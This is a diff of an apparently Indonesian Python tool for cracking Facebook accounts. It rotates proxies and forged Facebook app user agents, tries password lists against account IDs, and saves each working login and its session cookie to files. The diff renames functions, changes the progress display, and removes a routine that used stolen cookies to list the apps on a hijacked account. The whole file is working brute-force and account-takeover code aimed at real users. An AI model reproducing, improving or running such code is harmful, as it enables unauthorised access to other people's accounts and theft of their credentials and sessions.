@@ -40,7 +40,7 @@ try:
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKontolodon')
-prox=open('.prox.txt','r').read().splitlines()
+prox = open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	rr = random.randint; rc = random.choice
 	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
@@ -73,7 +73,11 @@ for xd in range(10000):
 	redmii = f"Mozilla/5.0 (Linux; Android {str(rr(9,10))}; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(0,200))}.0.{str(rr(500,4000))}.{str(rr(0,200))} Mobile SFB/{str(rr(0,150))}.0.{str(rr(0,5000))}.{str(rr(0,200))} Mobile Safari/537.36"
 	uaku2 = random.choice([zax1,zax4,redmii])
 	ugen.append(uaku2)
-def uaku():
+for cc in range(10000):
+    rc = random.choice
+    uaku3 = rc(["Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Redmi 9 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
+    ugen.append(uaku3)
+def ugen():
 	try:
 		ua=open('bbnew.txt','r').read().splitlines()
 		for ub in ua:
@@ -694,7 +698,7 @@ def atur_id():
 #----------[ MENU-METODE ]----------#
 def atur_method():
 	print("")
-	print(f"{biru}╭────────────────────────────────────────────{puti}") 
+	print(f"\n{biru}╭────────────────────────────────────────────{puti}") 
 	print(f'{biru}└──[{puti} 01. Validate ')
 	print(f'{biru}└──[{puti} 02. Reguler ')
 	print(f"{biru}╭────────────────────────────────────────────{puti}") 
@@ -724,7 +728,7 @@ def atur_method():
 def passwordlist():
 	global prog,des
 	print(f"{biru}╭────────────────────────────────────────────{puti}")
-	print(f'{biru}└──[{puti} WAITING ')
+	print(f'{biru}└──[{puti} PROSES CRACK SEDANG BERLANGSUNG')
 	print(f"{biru}─────────────────────────────────────────────{puti}")
 	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
@@ -799,8 +803,9 @@ def crackvalidate(idf,pwx,url):
 	ses = requests.Session()
 	rr = random.randint
 	rc = random.choice
-	emot = rc(["🥸",])
-	prog.update(des,description=f"\r {emot}(Validate)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
+	asu = random.choice([m, k, h, u, b])
+	emot = rc(["😝","😜","🤪"])
+	prog.update(des,description=f"\r {emot}({asu}Validate{puti})(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -859,7 +864,6 @@ def crackvalidate(idf,pwx,url):
 				print(f'{hijo}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
-				cek_apk(ses,kuki)
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
@@ -884,8 +888,9 @@ def crackreguler(idf,pwx,url):
 	ses = requests.Session()
 	rr = random.randint
 	rc = random.choice
+	asu = random.choice([m, k, h, u, b])
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot}(Reguler)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s) "%(hijo,puti,kun,puti,hijo,puti))
+	prog.update(des,description=f"\r {emot}({asu}Reguler{puti})(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s) "%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -945,7 +950,6 @@ def crackreguler(idf,pwx,url):
 				print(f'{hijo}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
-				cek_apk(ses,kuki)
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
@@ -1027,26 +1031,6 @@ def ceker(idf,pw):
 		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 		#cp+=1
 		
-#----------------------[ CEK-APLIKASI ]---------------------#
-def cek_apk(ses,kuki):
-	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
-	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
-	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
 #----------[ SYSTEM-CONTROL ]----------#	
 if __name__=='__main__':
 	try:os.system('git pull')
